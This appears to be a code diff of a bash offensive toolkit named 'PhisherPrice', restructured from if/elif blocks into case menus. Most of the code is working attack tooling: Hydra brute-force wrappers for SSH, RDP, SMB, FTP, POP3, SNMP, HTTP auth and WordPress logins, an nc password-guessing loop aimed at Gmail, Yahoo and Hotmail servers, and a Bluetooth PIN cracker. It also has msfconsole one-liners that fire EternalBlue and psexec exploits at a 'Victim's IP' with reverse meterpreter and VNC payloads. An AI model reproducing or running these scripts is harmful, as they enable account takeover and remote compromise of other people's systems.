-  echo "Login Failed"
-  echo -e "-------------------------------------------"
-fi
-
-read -p "Press enter to continue."
-
-elif [ "$x" == "$HYDRAWPAUTOBRUTE" ]; then                    #hynull-Option-9
-clear
-echo "Hydra WP Auto Brute"
-echo "Enter target URL (e.g. target.com):"
-read -e url
-echo "Enter path to login page (e.g. /wp-login.php):"
-read -e path
-echo "Enter username or path to wordlist:"
-read -e user
-echo "Enter password or path to wordlist:"
-read -e pass
-echo "Enter a string that appears on a failed login page:"
-read -e bad
-echo "Enter POST parameter string (e.g. 'log=^USER^&pwd=^PASS^'):"
-read -e parameter
-
-clear
-echo -e "\n-------------------------------------------"
-echo "Executing the following command:"
-echo "hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass"
-echo "Target URL: http://$url/$path"
-echo "Username: $user"
-echo "Password: $pass"
-echo "Failed login string: $bad"
-echo "POST parameter string: $parameter"
-echo -e "-------------------------------------------"
-
-echo "Running hydra..."
-output=$(hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass 2>&1)
-
-if echo "$output" | grep -q "1 valid password found"; then
-  echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo -e "-------------------------------------------"
-else
-  clear
-  echo -e "\n-------------------------------------------"
-  echo "Login Failed"
-  echo -e "-------------------------------------------"
-fi
-
-# Prompt user to continue
-read -p "Press enter to continue."
-
-elif [ "$x" == "$hynull6" ]; then                    #hynull-Option-6
-clear
-echo -e '\e[1;33m
-                    ________  
-______   ____ ______\_____  \ 
-\____ \ /  _ \\____ \ _(__  < 
-|  |_> >  <_> )  |_> >       \
-|   __/ \____/|   __/______  /
-|__|          |__|         \/ Brute Force \e[1;34m
-'
-echo "POP3 Password Cracking Script Using Hydra"
-echo -e "\n-------------------------------------------"
-echo "Enter Known User or User List:"
-read -e hydrauser
-echo "Enter Password List Location:"
-read -e hydrapasslist
-echo "Enter IP Address:"
-read -e hydraip
-
-echo -e "\n-------------------------------------------"
-echo "Running hydra..."
-output=$(hydra -l $hydrauser -P $hydrapasslist -f $hydraip pop3 -V 2>&1)
-
-if echo "$output" | grep -q "1 valid password found"; then
-  echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo "Password found: $(echo "$output" | grep -oP '(?<=password: )\S+')"
-  echo -e "-------------------------------------------"
-else
-  clear
-  echo -e "\n-------------------------------------------"
-  echo "Login Failed"
-  echo -e "-------------------------------------------"
-fi
-
-read -p "Press enter to continue."
-
-elif [ "$x" == "$hynull7" ]; then                    #hynull-Option-7
-clear
-echo -e '\e[1;33m
-   _____  _______  ____ 
-  /  |  | \   _  \/_   |
- /   |  |_/  /_\  \|   |
-/    ^   /\  \_/   \   |
-\____   |  \_____  /___|
-     |__|        \/ Brute Force \e[1;34m
-'
-echo "HTTP Basic Authentication Password Cracking Script Using Hydra"
-echo -e "\n-------------------------------------------"
-echo "Enter User List Location:"
-read -e hydrauser
-echo "Enter Password List Location:"
-read -e hydrapasslist
-echo "Enter IP Address:"
-read -e hydraip
-echo "Enter the 401 Login Realm"
-read -e hyhost
-
-echo -e "\n-------------------------------------------"
-echo "Running Hydra..."
-output=$(hydra -L $hydrauser -P $hydrapasslist $hydraip http-get /$hyhost 2>&1)
-
-if echo "$output" | grep -q "1 valid password found"; then
-  echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo -e "-------------------------------------------"
-  echo "Password: $(echo "$output" | grep -oP '(?<=login:\s).*$')"
-  echo -e "-------------------------------------------"
-else
-  echo -e "\n-------------------------------------------"
-  echo "Login Failed"
-  echo -e "-------------------------------------------"
-fi
-
-read -p "Press enter to continue."
-
-elif [ "$x" == "$hynull8" ]; then                    #hynull-Option-8
-clear
-echo -e '\e[1;33m
-__________________ __________ 
-\______   \______ \\______   \
- |       _/|    |  \|     ___/
- |    |   \|    `   \    |    
- |____|_  /_______  /____|    
-        \/        \/ Brute Force \e[1;34m
-'
-echo "RDP Password Cracking Script Using Hydra"
-echo -e "\n-------------------------------------------"
-echo "Enter the username or username list file path:"
-read -e hydrauser8
-
-echo "Enter the password list file path:"
-read -e hydrapasslist8
-
-echo "Enter the target IP address:"
-read -e hydraip8
-
-if [ -f "$hydrauser8" ]; then
-  hydrauser8="-M $hydrauser8"
-fi
-
-echo -e "\n-------------------------------------------"
-echo "Running hydra..."
-output=$(hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8 2>&1)
-
-if echo "$output" | grep -q "1 valid password found"; then
-  password=$(echo "$output" | grep -o "Password:.*" | cut -d' ' -f2-)
-  echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo "Password: $password"
-  echo -e "-------------------------------------------"
-else
-  clear
-  echo -e "\n-------------------------------------------"
-  echo "Login Failed"
-  echo -e "-------------------------------------------"
-fi
-read -p "Press enter to continue."
-
-elif [ "$x" == "$newoption1" ]; then                    #hynull-Option-9
-clear
-echo -e '\e[1;33m
-  _________   _____ __________ 
- /   _____/  /     \\______   \
- \_____  \  /  \ /  \|    |  _/
- /        \/    Y    \    |   \
-/_______  /\____|__  /______  /
-        \/         \/       \/ Brute Force \e[1;34m
-'
-echo "SMB Password Cracking Script Using Hydra"
-echo -e "\n-------------------------------------------"
-echo "Enter Known User or User List:"
-read -e hydrauser
-echo "Enter Password List Location:"
-read -e hydrapasslist
-echo "Enter the IP Address:"
-read -e hydraip
-
-echo -e "\n-------------------------------------------"
-echo "Running hydra..."
-output=$(hydra -t 1 -V -f -l $hydrauser -P $hydrapasslist $hydraip smb 2>&1)
-
-if echo "$output" | grep -q "1 valid password found"; then
-  echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo -e "-------------------------------------------"
-else
-  echo -e "\n-------------------------------------------"
-  echo "Login Failed"
-  echo -e "-------------------------------------------"
-fi
-
-read -p "Press enter to continue."
-
-else 
-
-n
-
-
-fi
-
-elif [ "$x" == "$subg" ]; then                    #jhon
-clear
+read -r -p" └─────► " choice
+
+    case $choice in
+      1)
+        btoolkit
+        ;;
+      2)
+       autohydrasub
+        ;;
+      3)
+       clear
 
 echo -e "\nPassword Cracking Script Using John the Ripper"
 echo -e "-------------------------------------------\n"
@@ -1662,9 +1104,8 @@ echo -e "\n-------------------------------------------"
 echo "Cracking process complete!"
 echo -e "-------------------------------------------\n"
 
-read -p "Press Enter to continue." 
-
-elif [ "$x" == "$john2" ]; then                    #john2
+        ;;
+      4)
 echo "Enter the path to the archive file:"
 read -e archive
 
@@ -1697,7 +1138,21 @@ else
 echo "Unknown archive format!"
 read -p "Press Enter to continue." 
 fi
-elif [ "$x" == "$subh" ]; then                    #Sub-Option-h
+        ;;
+      5)
+        clear
+if ! command -v hash-identifier &> /dev/null
+then
+    echo "hash-identifier is not installed. Would you like to install it? (y/n)"
+    read choice
+    if [ "$choice" == "y" ]; then
+        sudo apt-get install hash-identifier
+    else
+        return
+    fi
+fi
+
+# Run hash-identifier
 clear
 echo -e "\nHash Identifier"
 echo -e "-------------------------------------------\n"
@@ -1712,11 +1167,9 @@ echo -e '
 |               Good Bye                  |
 -------------------------------------------
 '
-
-read -p "Press Enter to continue." 
-
-elif [ "$x" == "$subi" ]; then                    #Sub-Option-i
-clear
+        ;;
+      6)
+        clear
 echo -e '\e[1;33m
   ___ ___               .__                   __   
  /   |   \_____    _____|  |__   ____ _____ _/  |_ 
@@ -1763,11 +1216,9 @@ else
   echo "Password not found in the wordlist."
   echo -e "-------------------------------------------\n"
 fi
-
-read -p "Press Enter to continue." 
-
-elif [ "$x" == "$subj" ]; then                    #Sub-Option-j
-clear
+        ;;
+      7)
+        clear
 echo -e '\e[1;33m
    _____  .__                                    __                             
   /  _  \ |__|______   ________________    ____ |  | __           ____    ____  
@@ -1811,10 +1262,9 @@ else
   echo "Password not found in the password list."
   echo -e "-------------------------------------------\n"
 fi
-  read -p "Press Enter to continue."
-
-elif [ "$x" == "$subk" ]; then                    #Sub-Option-k
-clear
+        ;;
+      8)
+        clear
 echo -e "\nLaunching SQLdict"
 echo -e "-------------------------------------------\n"
 
@@ -1822,9 +1272,8 @@ echo -e "Launching SQLdict...\n"
 
 sqldict
 
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$honeywhy" ]; then                    #hynull-Option-9
+        ;;
+      9)
 echo -n "Enter wireless interface (e.g. wlan1 or wlan0): "
 read -e iface
 
@@ -1860,12 +1309,9 @@ aircrack-ng -w /path/to/dictionary.txt $fname-01.cap
 echo "Cleaning up..."
 kill $pid1 $pid2 $pid3 $pid4 $pid5
 airmon-ng stop mon0
-
-
-read
-
-elif [ "$x" == "$dumpitall" ]; then                    #hynull-Option-9
-# A modified version of Gary Hooks' work sys_info.sh:
+        ;;
+      10)
+        # A modified version of Gary Hooks' work sys_info.sh:
 # 	Original Author: Gary Hooks
 # 	Web: http://www.twintel.co.uk
 # Supporting input from:
@@ -2095,17 +1541,686 @@ tar -czvf $FINAL_PATH $folderName/*
 printf "\nCleaning up\n\n"
 rm -rf $folderName
 printf "Results will be stored here: \t $FINAL_PATH \n\n"
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+# autohydra sub Menu function
+autohydrasub() {
+  while true
+  do
+clear
+echo -e "${banner}"
+echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
+                   
+\e[0m\e[3;39m \e[1;31m
+Hydra Brute Force
+\e[3;39m
+(1) Email Crack (SMTP)
+(2) SNMP Brute Force
+(3) FTP Brute Force
+(4) SSH  Brute Force
+(5) SSH  Brute Force (port 22)
+(6) POP3 Brute Force
+(7) HTTP 401 Brute Force
+(8) Windows RDP Brute Force
+(9) SMB Brute Force
+(10) WP AUTO BRUTE
 
+Press q/Q To Exit
+Press b/B To Go To Back
+'
+echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Hydra$Blue]:"
+read -r -p" └─────► " choice
+    case $choice in
+      e|E)
+        clear
+# Define SMTP options
+declare -A smtp_options=(
+  ["gmail"]="smtp.gmail.com:587"
+  ["yahoo"]="smtp.mail.yahoo.com:587"
+  ["hotmail"]="smtp.live.com:587"
+)
 
+# Define POP3 options
+declare -A pop3_options=(
+  ["gmail"]="pop.gmail.com:995"
+  ["yahoo"]="pop.mail.yahoo.com:995"
+  ["hotmail"]="outlook.office365.com:995"
+)
 
-else 
+# Define IMAP options
+declare -A imap_options=(
+  ["gmail"]="imap.gmail.com:993"
+  ["yahoo"]="imap.mail.yahoo.com:993"
+  ["hotmail"]="outlook.office365.com:993"
+)
 
-n
+# Display banner
+echo -e '\e[1;33m
+   _____                       __    
+  / ___ \____________    ____ |  | __
+ / / ._\ \_  __ \__  \ _/ ___\|  |/ /
+<  \_____/|  | \// __ \\  \___|    < 
+ \_____\  |__|  (____  /\___  >__|_ \
+                     \/     \/     \/\e[1;34m
+'
+echo -e "\e[1;33mSimple Email Cracking Script.\e[0m"
+echo -e "\n-------------------------------------------"
 
+# Select email service
+echo "Choose an email service:"
+echo "SMTP:"
+for service in "${!smtp_options[@]}"; do
+  echo "[$service] ${smtp_options[$service]}"
+done
+echo "POP3:"
+for service in "${!pop3_options[@]}"; do
+  echo "[$service] ${pop3_options[$service]}"
+done
+echo "IMAP:"
+for service in "${!imap_options[@]}"; do
+  echo "[$service] ${imap_options[$service]}"
+done
 
+read -e -p "Email service: " email_service
+
+# Select protocol and port based on the email service chosen
+case $email_service in
+  "gmail")
+    smtp="${smtp_options[$email_service]}"
+    pop3="${pop3_options[$email_service]}"
+    imap="${imap_options[$email_service]}"
+    ;;
+  "yahoo")
+    smtp="${smtp_options[$email_service]}"
+    pop3="${pop3_options[$email_service]}"
+    imap="${imap_options[$email_service]}"
+    ;;
+  "hotmail")
+    smtp="${smtp_options[$email_service]}"
+    pop3="${pop3_options[$email_service]}"
+    imap="${imap_options[$email_service]}"
+    ;;
+  *)
+    echo "Invalid email service"
+    read
+    ;;
+esac
+
+# Get email address and password file path
+echo -n "Enter email address: "
+read -e email
+echo -n "Enter password file path: "
+read -e password_file
+
+# Select protocol and port
+echo -n "Enter protocol (smtp/pop3/imap): "
+read -e protocol
+echo -n "Enter port number: "
+read -e port
+
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;34mCracking email password...\e[0m"
+echo -e "-------------------------------------------"
+while read password; do
+  case $protocol in
+    "smtp")
+      response=$(echo "USER $email" && echo "PASS $password" && echo "QUIT" | nc -w 10 "$smtp" "$port")
+      ;;
+    "pop3")
+      pop_host=$(echo "$pop" | cut -d: -f1)
+      pop_port=$(echo "$pop" | cut -d: -f2)
+      response=$(echo "USER $email" && echo "PASS $password" && echo "QUIT" | nc -w 10 "$pop_host" "$pop_port")
+      ;;
+    "imap")
+      imap_host=$(echo "$imap" | cut -d: -f1)
+      imap_port=$(echo "$imap" | cut -d: -f2)
+      response=$(echo "a login $email $password" && echo "b select inbox" && echo "c logout" | nc -w 10 "$imap_host" "$imap_port")
+      ;;
+    *)
+      echo -e "\n-------------------------------------------"
+      echo -e "\e[1;31mInvalid protocol.\e[0m"
+      echo -e "-------------------------------------------"
+      read
+      read
+  esac
+  
+  if [[ "$response" == *"+OK"* ]]; then
+    echo -e "\n-------------------------------------------"
+    echo -e "\e[1;32mPassword found!\e[0m"
+    echo -e "-------------------------------------------"
+    echo -e "Email: $email"
+    echo -e "Password: $password"
+    read
+  fi
+done < "$password_file"
+
+read
+        ;;
+      1)
+        clear
+echo -e '\e[1;33m
+   _____                       __    
+  / ___ \____________    ____ |  | __
+ / / ._\ \_  __ \__  \ _/ ___\|  |/ /
+<  \_____/|  | \// __ \\  \___|    < 
+ \_____\  |__|  (____  /\___  >__|_ \
+                     \/     \/     \/\e[1;34m
+'
+echo -e "\e[1;33mSimple Email Cracking Script Using Hydra.\e[0m"
+echo -e "\n-------------------------------------------"
+
+echo -n "Choose a SMTP service (Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com): "
+read -e smtp
+
+echo -n "Enter Email Address: "
+read -e email
+
+echo -n "Provide Directory of Wordlist for Passwords: "
+read -e wordlist
+
+echo -n "Enter SMTP Port Number (default is 465): "
+read -e port
+port=${port:-465}  # set default port number if no input is provided
+
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;34mCracking email password...\e[0m"
+echo -e "-------------------------------------------"
+output=$(hydra -S -l "$email" -P "$wordlist" -e ns -V -s "$port" "$smtp" smtp 2>&1)
+
+if [[ $? -ne 0 ]]; then
+  echo -e "\e[1;31mAn error occurred while running Hydra. Please check your input and try again.\e[0m"
+  return
 fi
 
-elif [ "$x" == "$option3" ]; then                          #Option3
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;32mHydra output:\e[0m"
+echo -e "-------------------------------------------"
+echo -e "$output"
+
+        ;;
+      2)
+        clear
+echo -e '\e[1;33m
+  _________ _______      _____ __________ 
+ /   _____/ \      \    /     \\______   \
+ \_____  \  /   |   \  /  \ /  \|     ___/
+ /        \/    |    \/    Y    \    |    
+/_______  /\____|__  /\____|__  /____|    
+        \/         \/         \/ Brute Force \e[1;34m
+'
+echo "Simple SNMP Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter the path of the password list:"
+read -e hydrasnmppass
+echo "Enter The Host IP Address of SNMP Server:"
+read -e hydraip
+
+echo -e "\n-----------------------------"
+echo "Attempting SNMP password cracking..."
+echo "-----------------------------"
+output=$(hydra -P $hydrasnmppass -v $hydraip snmp 2>&1)
+
+if echo "$output" | grep -q "login:\|password:"; then
+  echo -e "\n-------------------------------------------"
+  echo "SNMP password cracked successfully!"
+  echo -e "-------------------------------------------"
+  echo "Cracked password:"
+  echo "$output"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Failed to crack SNMP password."
+  echo -e "-------------------------------------------"
+fi
+
+        ;;
+      3)
+       clear
+echo -e '\e[1;33m
+________________________________ 
+\_   _____/\__    ___/\______   \
+ |    __)    |    |    |     ___/
+ |     \     |    |    |    |    
+ \___  /     |____|    |____|    
+     \/ Brute Force\e[1;34m
+'
+echo "FTP Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter Known User:"
+read -e hydrauser
+echo "Enter Password List Location:"
+read -e hydrapasslist
+echo "Enter the IP Address:"
+read -e hydraip
+
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+
+        ;;
+      4)
+       clear
+echo -e '\e[1;33m
+  _________ _________ ___ ___  
+ /   _____//   _____//   |   \ 
+ \_____  \ \_____  \/    ~    \
+ /        \/        \    Y    /
+/_______  /_______  /\___|_  / 
+        \/        \/       \/ Brute Force \e[1;34m
+'
+echo "SSH Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter User List Location:"
+read -e hydrauser2
+echo "Enter Password List Location:"
+read -e hydrapasslist2
+echo "Enter IP Address:"
+read -e hydraip2
+
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  password=$(echo "$output" | grep "login:" | awk '{print $NF}')
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo "Password: $password"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+        ;;
+      5)
+        clear
+echo -e "\nFTP Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter Known User:"
+read -e hydrauser
+echo "Enter Password List Location:"
+read -e hydrapasslist
+echo "Enter the IP Address:"
+read -e hydraip
+
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+        ;;
+      6)
+        clear
+echo "Hydra WP Auto Brute"
+echo "Enter target URL (e.g. target.com):"
+read -e url
+echo "Enter path to login page (e.g. /wp-login.php):"
+read -e path
+echo "Enter username or path to wordlist:"
+read -e user
+echo "Enter password or path to wordlist:"
+read -e pass
+echo "Enter a string that appears on a failed login page:"
+read -e bad
+echo "Enter POST parameter string (e.g. 'log=^USER^&pwd=^PASS^'):"
+read -e parameter
+
+clear
+echo -e "\n-------------------------------------------"
+echo "Executing the following command:"
+echo "hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass"
+echo "Target URL: http://$url/$path"
+echo "Username: $user"
+echo "Password: $pass"
+echo "Failed login string: $bad"
+echo "POST parameter string: $parameter"
+echo -e "-------------------------------------------"
+
+echo "Running hydra..."
+output=$(hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+        ;;
+      7)
+        clear
+echo -e '\e[1;33m
+                    ________  
+______   ____ ______\_____  \ 
+\____ \ /  _ \\____ \ _(__  < 
+|  |_> >  <_> )  |_> >       \
+|   __/ \____/|   __/______  /
+|__|          |__|         \/ Brute Force \e[1;34m
+'
+echo "POP3 Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter Known User or User List:"
+read -e hydrauser
+echo "Enter Password List Location:"
+read -e hydrapasslist
+echo "Enter IP Address:"
+read -e hydraip
+
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -l $hydrauser -P $hydrapasslist -f $hydraip pop3 -V 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo "Password found: $(echo "$output" | grep -oP '(?<=password: )\S+')"
+  echo -e "-------------------------------------------"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+        ;;
+      8)
+        clear
+echo -e '\e[1;33m
+   _____  _______  ____ 
+  /  |  | \   _  \/_   |
+ /   |  |_/  /_\  \|   |
+/    ^   /\  \_/   \   |
+\____   |  \_____  /___|
+     |__|        \/ Brute Force \e[1;34m
+'
+echo "HTTP Basic Authentication Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter User List Location:"
+read -e hydrauser
+echo "Enter Password List Location:"
+read -e hydrapasslist
+echo "Enter IP Address:"
+read -e hydraip
+echo "Enter the 401 Login Realm"
+read -e hyhost
+
+echo -e "\n-------------------------------------------"
+echo "Running Hydra..."
+output=$(hydra -L $hydrauser -P $hydrapasslist $hydraip http-get /$hyhost 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+  echo "Password: $(echo "$output" | grep -oP '(?<=login:\s).*$')"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+        ;;
+      9)
+        clear
+echo -e '\e[1;33m
+__________________ __________ 
+\______   \______ \\______   \
+ |       _/|    |  \|     ___/
+ |    |   \|    `   \    |    
+ |____|_  /_______  /____|    
+        \/        \/ Brute Force \e[1;34m
+'
+echo "RDP Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter the username or username list file path:"
+read -e hydrauser8
+
+echo "Enter the password list file path:"
+read -e hydrapasslist8
+
+echo "Enter the target IP address:"
+read -e hydraip8
+
+if [ -f "$hydrauser8" ]; then
+  hydrauser8="-M $hydrauser8"
+fi
+
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  password=$(echo "$output" | grep -o "Password:.*" | cut -d' ' -f2-)
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo "Password: $password"
+  echo -e "-------------------------------------------"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+        ;;
+      10)
+        clear
+echo -e '\e[1;33m
+  _________   _____ __________ 
+ /   _____/  /     \\______   \
+ \_____  \  /  \ /  \|    |  _/
+ /        \/    Y    \    |   \
+/_______  /\____|__  /______  /
+        \/         \/       \/ Brute Force \e[1;34m
+'
+echo "SMB Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter Known User or User List:"
+read -e hydrauser
+echo "Enter Password List Location:"
+read -e hydrapasslist
+echo "Enter the IP Address:"
+read -e hydraip
+
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -t 1 -V -f -l $hydrauser -P $hydrapasslist $hydraip smb 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+
+# Bluetooth toolkit menu
+btoolkit() {
+  while true
+  do
+  clear
+	echo -e "${banner}"
+	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
+                   
+\e[0m\e[3;39m \e[1;31m
+Bluetooth Toolkit
+\e[3;39m
+(1) Bluetooth device scanner
+(2) Bluetooth PIN Code Cracker
+
+Press q/Q To Exit
+Press b/B To Go To Back
+'
+echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Bluetooth-Toolkit$Blue]:"
+read -r -p" └─────► " choice
+
+    case $choice in
+      1)
+        clear
+echo -e "\e[1;33mBluetooth PIN Code Cracking Script.\e[0m"
+echo -e "\n-------------------------------------------"
+
+echo -n "Enter the MAC address of the target device: "
+read -e mac_address
+echo -n "Enter the name of the PIN code file: "
+read -e pin_file
+
+clear
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;34mCracking Bluetooth PIN code...\e[0m"
+echo -e "-------------------------------------------\n"
+
+while read pin; do
+  echo "Trying PIN code: $pin"
+  rfcomm connect hci0 "$mac_address" "$pin" 1>/dev/null 2>&1
+  
+  if [[ $? -eq 0 ]]; then
+    echo -e "\n-------------------------------------------"
+    echo -e "\e[1;32mPIN code found!\e[0m"
+    echo -e "-------------------------------------------"
+    echo -e "PIN code: $pin"
+    read -p "Press Enter to continue."
+    break
+  fi
+  
+done < "$pin_file"
+
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;31mPIN code not found.\e[0m"
+echo -e "-------------------------------------------"
+read -p "Press Enter to continue."
+        ;;
+      2)
+        clear
+echo -e "\nBluetooth device scanner"
+echo -e "-------------------------------------------\n"
+
+echo "Scanning for nearby devices..."
+devices=$(hcitool scan | grep -oP '^\S+\s+\K.*')
+
+if [ -z "$devices" ]; then
+  echo -e "\nNo devices found."
+  read
+fi
+
+echo -e "\n-------------------------------------------"
+echo "Nearby devices:"
+echo -e "-------------------------------------------\n"
+
+echo "$devices"
+
+echo -e "\n-------------------------------------------"
+echo -e "Enter the MAC address of the device to connect: "
+read -e mac_address
+
+echo "Connecting to $mac_address..."
+rfcomm connect /dev/rfcomm0 "$mac_address" 1 &
+sleep 1
+
+if [[ $(echo $?) -ne 0 ]]; then
+  echo -e "\nFailed to connect to $mac_address."
+  read
+fi
+
+echo -e "\nSuccessfully connected to $mac_address."
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+# Submenu 3 function
+submenu3() {
+  while true
+  do
+# Get a list of all available network interfaces
+interfaces=$(ip link show | awk -F': ' '{print $2}' | grep -v lo)
+
+# Loop through each interface and check if it is available
+for interface in $interfaces; do
+    if [[ $(ip link show $interface) ]]; then
+        # Get the IP address of the current interface
+        ip=$(ip addr show $interface | awk '/inet / {print $2}' | cut -d/ -f 1)
+
+        # Start the appropriate service based on the interface name
+        case $interface in
+            wlan0|wlp*)
+                service postgresql start
+                ;;
+            eth0|enp*)
+                service mysql start
+                ;;
+            *)
+                echo "No service found for interface $interface"
+                ;;
+        esac
+    fi
+done
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
@@ -2131,35 +2246,230 @@ Auto Xsploit
 (16) Backdoor .exe
 (17) Bind .exe With Payload & Encode (using shikata_ga_nai)
 (18) Android    --> pwnd.apk (payload & listener) 
-CTRL + C To Exit
-Press ENTER To Go To Main Menu
+
+Press q/Q To Exit
+Press b/B To Go To Back
 '
-auto1='1'
-auto2='2'
-auto3='3'
-auto4='4'
-auto5='5'
-auto6='6'
-auto7='7'
-auto8='8'
-auto9='9'
-auto10='10'
-auto11='11'
-auto12='12'
-auto13='13'
-auto14='14'
-auto15='15'
-auto16='16'
-auto17='17'
-auto18='18'
-
-wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Auto Xsploit$Blue]:"
-read -e -p" └─────► " x
+read -r -p" └─────► " choice
+    case $choice in
+      1)
+        scannersmenu
+        ;;
+      2)
+      clear
+        echo "Victim's IP:"
+read -e r
 
-if [ "$x" == "$auto1" ]; then                    #auto-Option-1
-ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
-service postgresql start
+msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "
+        ;;
+      3)
+      clear
+        echo "Victim's IP:"
+read -e r
+
+msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
+        ;;
+      4)
+      clear
+echo "Victim's IP:"
+read -e r
+
+msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
+        ;;
+      5)
+      clear
+       echo "Victim's IP:" 
+read -e r
+
+msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"
+        ;;
+      6)
+      clear
+        echo 'Uripath: (/)'
+read -e u
+msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"
+        ;;
+      7)
+      clear
